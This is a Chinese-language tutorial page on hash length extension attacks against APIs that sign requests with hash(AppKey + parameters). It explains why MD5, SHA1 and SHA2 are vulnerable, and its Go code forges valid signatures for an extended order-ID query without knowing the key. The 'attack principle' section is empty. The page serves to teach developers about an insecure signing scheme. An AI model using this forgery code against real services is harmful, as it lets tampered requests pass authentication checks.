# 长度扩展攻击 length extension attacks

在日常的开发中，很有可能会开发一些接口给第三方使用，为了保证数据在传输过程中不被篡改，一般会考虑对请求参数做`签名验证`

对数据做哈希签名只能解决数据`完整性`问题，但不能确认是否是真实第三方发出的，为了解决身份认证的问题，会在签名前的数据中加入第三方和服务方共有的数据，这样服务方收到数据后既能验证第三方的身份又能保证数据的完整性

## 常见的接口签名方式

最常见的接口签名方式可能就是`AppId` `AppKey`模式了

1. 从服务方获得`AppId` `AppKey`
2. 请求时构造签名参数，规则如下：
```text
sign = hash(AppKey + appid=AppId&a=a&b=b&c=c)
curl xxx.com?appid=AppId&a=a&b=b&c=c&sign=sign
```

伪代码中`hash`方法包括，但不限于`MD5` `SHA1` `SHA2系列`等，之所以单独说了这几种哈希算法是因为他们都是基于`Merkle–Damgård`构造模式进行哈希计算的，具体的流程可以翻看前面的示意图

这种基于`Merkle–Damgård`构造模式的哈希算法，如果将`AppKey`放在签名就有`长度扩展攻击`的风险

## 攻击原理

## 示例

{% tabs %}
{% tab title="MD5" %}
```go
data := "orderIds=11111,999"
injectData := ",22222,33333"

md5Sign := md5.Sum([]byte(KEY + data))
fmt.Println("origin md5:", hex.EncodeToString(md5Sign[:]))
fmt.Println("origin query:", data)

b := NewBuilder([]byte(data), md5Sign[:], len(KEY), crypto.MD5)
padding, newMD5, err := b.Build()
if err != nil {
    t.Error(err)
}

newMD5.Write([]byte(injectData))
newSign := newMD5.Sum(nil)
fmt.Println("new md5: ", hex.EncodeToString(newSign))
fmt.Println("new query: ", data+string(padding)+injectData)

if checkSum(newSign, []byte(KEY+data+string(padding)+injectData), crypto.MD5) {
    fmt.Println("It works for " + crypto.MD5.String())
}
```
{% endtab %}

{% tab title="SHA1" %}
```go
data := "orderIds=11111,999"
injectData := ",22222,33333"

sha1Sign := sha1.Sum([]byte(KEY + data))
fmt.Println("origin sha1:", hex.EncodeToString(sha1Sign[:]))
fmt.Println("origin query:", data)

b := NewBuilder([]byte(data), sha1Sign[:], len(KEY), crypto.SHA1)
padding, newSha1, err := b.Build()
if err != nil {
    t.Error(err)
}

newSha1.Write([]byte(injectData))
newSign := newSha1.Sum(nil)
fmt.Println("new sha1: ", hex.EncodeToString(newSign))
fmt.Println("new query: ", data+string(padding)+injectData)

if checkSum(newSign, []byte(KEY+data+string(padding)+injectData), crypto.SHA1) {
    fmt.Println("It works for " + crypto.SHA1.String())
}
```
{% endtab %}

{% tab title="SHA256" %}
```go
data := "orderIds=11111,999"
injectData := ",22222,33333"

sha256Sign := sha256.Sum256([]byte(KEY + data))
fmt.Println("origin sha256:", hex.EncodeToString(sha256Sign[:]))
fmt.Println("origin query:", data)

b := NewBuilder([]byte(data), sha256Sign[:], len(KEY), crypto.SHA256)
padding, newSha256, err := b.Build()
if err != nil {
    t.Error(err)
}

newSha256.Write([]byte(injectData))
newSign := newSha256.Sum(nil)
fmt.Println("new sha256: ", hex.EncodeToString(newSign))
fmt.Println("new query: ", data+string(padding)+injectData)

if checkSum(newSign, []byte(KEY+data+string(padding)+injectData), crypto.SHA256) {
    fmt.Println("It works for " + crypto.SHA256.String())
}
```
{% endtab %}

{% tab title="SHA512" %}
```go
data := "orderIds=11111,999"
injectData := ",22222,33333"

sha512Sign := sha512.Sum512([]byte(KEY + data))
fmt.Println("origin sha512:", hex.EncodeToString(sha512Sign[:]))
fmt.Println("origin query:", data)

b := NewBuilder([]byte(data), sha512Sign[:], len(KEY), crypto.SHA512)
padding, newSha512, err := b.Build()
if err != nil {
    t.Error(err)
}

newSha512.Write([]byte(injectData))
newSign := newSha512.Sum(nil)
fmt.Println("new sha512: ", hex.EncodeToString(newSign))
fmt.Println("new query: ", data+string(padding)+injectData)

if checkSum(newSign, []byte(KEY+data+string(padding)+injectData), crypto.SHA512) {
    fmt.Println("It works for " + crypto.SHA512.String())
}
```
{% endtab %}
{% endtabs %}